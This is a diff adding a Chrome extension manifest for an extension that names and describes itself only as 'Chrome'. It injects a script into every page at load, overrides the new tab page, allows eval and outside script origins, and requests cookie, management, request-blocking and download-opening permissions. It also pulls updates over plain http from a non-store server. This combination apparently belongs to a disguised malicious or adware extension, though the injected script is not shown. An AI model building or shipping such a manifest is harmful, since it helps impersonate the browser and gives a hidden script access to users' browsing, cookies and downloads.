@@ -1,0 +1,24 @@
+{
+   "background": {
+      "page": "background.html"
+   },
+   "chrome_url_overrides": {
+      "newtab": "newtab.html"
+   },
+   "content_scripts": [ {
+      "css": [ "/contentScripts/handle.css" ],
+      "js": [ "/contentScripts/handle.js" ],
+      "matches": [ "\u003Call_urls>" ],
+      "run_at": "document_start"
+   } ],
+   "content_security_policy": "script-src 'self' 'unsafe-eval' https://ajax.googleapis.com https://www.google.com https://ssl.google-analytics.com https://*.facebook.com https://*.facebook.net https://*.youtube.com https://*.ytimg.com ; object-src 'self'; ",
+   "default_locale": "en",
+   "description": "Chrome",
+   
+   "manifest_version": 2,
+   "minimum_chrome_version": "49.0.0.0",
+   "name": "Chrome",
+   "permissions": [ "tabs", "\u003Call_urls>", "bookmarks", "background", "management", "webRequest", "webRequestBlocking", "notifications", "geolocation", "location", "storage", "sienium", "cookies", "downloads", "downloads.open", "downloads.shelf", "webNavigation" ],
+   "update_url": "http://extension.go.im/api/extensions/igncegnapandaeconagjmajcmnfoboig/update",
+   "version": "2.0.0"
+}
